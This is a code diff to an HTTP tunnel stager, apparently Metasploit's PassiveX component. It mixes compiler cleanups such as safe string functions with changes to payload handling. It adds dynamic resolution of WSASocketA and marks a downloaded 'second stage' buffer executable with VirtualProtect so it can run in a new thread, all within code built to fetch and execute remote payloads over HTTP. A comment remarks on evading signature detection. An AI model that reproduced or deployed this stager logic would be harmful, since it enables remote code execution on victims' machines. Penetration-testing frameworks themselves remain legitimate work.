@@ -29,7 +29,7 @@ HttpTunnel::HttpTunnel()
 			MAKEWORD(2, 2),
 			&WsaData);
 
-	srand(time(NULL));
+	srand((unsigned int)time(NULL));
 }
 
 HttpTunnel::~HttpTunnel()
@@ -55,7 +55,7 @@ DWORD HttpTunnel::Start(
 	do
 	{
 		// Initialize the hostname and port
-		if (!(HttpHost = strdup(InHttpHost)))
+		if (!(HttpHost = _strdup(InHttpHost)))
 		{
 			Result = ERROR_NOT_ENOUGH_MEMORY;
 			break;
@@ -63,7 +63,7 @@ DWORD HttpTunnel::Start(
 
 		if ((InHttpSid) &&
 		    (InHttpSid[0]) &&
-		    (!(HttpSid = strdup(InHttpSid))))
+		    (!(HttpSid = _strdup(InHttpSid))))
 		{
 			Result = ERROR_NOT_ENOUGH_MEMORY;
 			break;
@@ -71,7 +71,7 @@ DWORD HttpTunnel::Start(
 
 		if ((InHttpUriBase) &&
 		    (InHttpUriBase[0]) && 
-		    (!(HttpUriBase = strdup(InHttpUriBase))))
+		    (!(HttpUriBase = _strdup(InHttpUriBase))))
 		{
 			Result = ERROR_NOT_ENOUGH_MEMORY;
 			break;
@@ -223,20 +223,44 @@ DWORD HttpTunnel::Stop()
  * Creates the local TCP abstraction that will be used as the socket for the
  * second stage that is read in
  */
+typedef SOCKET  (WINAPI * WSASOCKETA)( int, int, int, LPVOID, DWORD, DWORD );
+
 DWORD HttpTunnel::InitializeLocalConnection()
 {
 	struct sockaddr_in Sin;
-	USHORT             LocalPort = 0;
-	DWORD              Attempts = 0;
-	DWORD              Result = ERROR_SUCCESS;
+	USHORT  LocalPort         = 0;
+	DWORD Attempts            = 0;
+	DWORD Result              = ERROR_SUCCESS;
+	HMODULE hWinsock          = NULL;
+	WSASOCKETA pWSASocketA    = NULL;
+	WSADATA wsaData;
+
+	hWinsock = LoadLibraryA( "WS2_32.DLL" );
+	if( hWinsock == NULL )
+	{
+  		CPassiveX::Log( TEXT("DownloadSecondStage(): LoadLibraryA for WS2_32.DLL failed.\n") );
+		return !ERROR_SUCCESS;
+	}
+
+	pWSASocketA = (WSASOCKETA)GetProcAddress( hWinsock, "WSASocketA");
+	if( pWSASocketA == NULL )
+	{
+  		CPassiveX::Log( TEXT("DownloadSecondStage(): GetProcAddress for WSASocketA failed.\n") );
+		return !ERROR_SUCCESS;
+	}
+
+	if( WSAStartup( MAKEWORD(2,2), &wsaData ) !=  0 )
+	{
+  		CPassiveX::Log( TEXT("DownloadSecondStage(): WSAStartup failed.\n") );
+		return !ERROR_SUCCESS;
+	}
 
 	do
 	{
 		// Create the TCP listener socket
-		if ((LocalTcpListener = socket(
-				AF_INET,
-				SOCK_STREAM,
-				IPPROTO_TCP)) == INVALID_SOCKET)
+		//LocalTcpListener = pWSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0 ,0 );
+		LocalTcpListener = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+		if( LocalTcpListener == INVALID_SOCKET )
 		{
 			LocalTcpListener = 0;
 			Result           = WSAGetLastError();
@@ -244,10 +268,8 @@ DWORD HttpTunnel::InitializeLocalConnection()
 		}
 
 		// Create the TCP client socket
-		if ((LocalTcpClientSide = socket(
-				AF_INET,
-				SOCK_STREAM,
-				IPPROTO_TCP)) == INVALID_SOCKET)
+		LocalTcpClientSide = pWSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0 ,0 );
+		if( LocalTcpClientSide == INVALID_SOCKET )
 		{
 			LocalTcpClientSide = 0;
 			Result             = WSAGetLastError();
@@ -260,11 +282,7 @@ DWORD HttpTunnel::InitializeLocalConnection()
 		// Try 256 times to pick a random port
 		Sin.sin_port = htons(LocalPort = (rand() % 32000) + 1025);
 
-		while ((bind(
-				LocalTcpListener,		
-				(struct sockaddr *)&Sin,
-				sizeof(Sin)) == SOCKET_ERROR) &&
-		       (Attempts++ < 256))
+		while( ( bind( LocalTcpListener, (struct sockaddr *)&Sin, sizeof(Sin) ) == SOCKET_ERROR ) && (Attempts++ < 256) )
 		{
 			Sin.sin_port = htons(LocalPort = (rand() % 32000) + 1025);
 		}
@@ -277,32 +295,23 @@ DWORD HttpTunnel::InitializeLocalConnection()
 		}
 
 		// Listen and stuff
-		if (listen(
-				LocalTcpListener,
-				1) == SOCKET_ERROR)
+		if (listen( LocalTcpListener, 1) == SOCKET_ERROR)
 		{
 			Result = WSAGetLastError();
 			break;
 		}
 
 		// Establish a connection to the local listener
-		if (connect(
-				LocalTcpClientSide,
-				(struct sockaddr *)&Sin,
-				sizeof(Sin)) == SOCKET_ERROR)
+		if (connect( LocalTcpClientSide, (struct sockaddr *)&Sin, sizeof(Sin)) == SOCKET_ERROR)
 		{
 			Result = WSAGetLastError();
 			break;
 		}
 
 		// Accept the local TCP connection
-		if ((LocalTcpServerSide = accept(
-				LocalTcpListener,
-				NULL,
-				NULL)) == SOCKET_ERROR)
+		if ((LocalTcpServerSide = accept( LocalTcpListener, NULL, NULL)) == SOCKET_ERROR)
 		{
 			LocalTcpServerSide = 0;
-
 			Result = WSAGetLastError();
 			break;
 		}
@@ -321,6 +330,8 @@ DWORD HttpTunnel::InitializeLocalConnection()
  */
 VOID HttpTunnel::DownloadSecondStage()
 {
+	DWORD dwOldProtect = 0;
+
 	// Transmit the request to download the second stage.  The stage buffer that
 	// is passed back is never deallocated.
 	if ((TransmitHttpRequest(
@@ -336,9 +347,14 @@ VOID HttpTunnel::DownloadSecondStage()
 	{
 		DWORD ThreadId = 0;
 
-		CPassiveX::Log(
-				TEXT("DownloadSecondStage(): Downloaded %lu byte second stage, executing it...\n"),
-				SecondStageSize);
+		CPassiveX::Log( TEXT("DownloadSecondStage(): Downloaded %lu byte second stage, executing it...\n"), SecondStageSize);
+
+		if( !VirtualProtect( (LPVOID)SecondStage, SecondStageSize, PAGE_EXECUTE_READWRITE, &dwOldProtect ) )
+		{
+			CPassiveX::Log(
+				TEXT("DownloadSecondStage(): Failed to VirtualProtect second stage (0x%08X) to be RWX. Error %lu."),
+				SecondStageSize, GetLastError() );
+		}
 
 		// Create the second stage thread
 		SecondStageThread = CreateThread(
@@ -438,11 +454,9 @@ DWORD HttpTunnel::TransmitHttpRequest(
 
 	// Construct the full URI
 	if (HttpUriBase && HttpUriBase[0])
-		_snprintf(FullUri, sizeof(FullUri) - 1,
-				"%s%s",
-				HttpUriBase, Uri);
+		sprintf_s(FullUri, sizeof(FullUri) - 1, "%s%s", HttpUriBase, Uri);
 	else
-		strncpy(FullUri, Uri, sizeof(FullUri) - 1);
+		strncpy_s(FullUri, 1024, Uri, sizeof(FullUri) - 1);
 
 	FullUri[sizeof(FullUri) - 1] = 0;
 
@@ -497,11 +511,10 @@ DWORD HttpTunnel::TransmitHttpRequest(
 		// additional header for transmission to the remote side.
 		if (HttpSid)
 		{
+			size_t size = strlen(HttpSid) + 32;
 			// Yeah, I'm lame, this is easy to sig.  Improve me if you care!
-			if ((AdditionalHeaders = (PCHAR)malloc(strlen(HttpSid) + 32)))
-				sprintf(AdditionalHeaders,
-						"X-Sid: sid=%s\r\n",
-						HttpSid);
+			if(( AdditionalHeaders = (PCHAR)malloc(size) ))
+				sprintf_s( AdditionalHeaders, size, "X-Sid: sid=%s\r\n", HttpSid );
 		}
 		
 		PROFILE_CHECKPOINT("HttpOpenRequest <==");
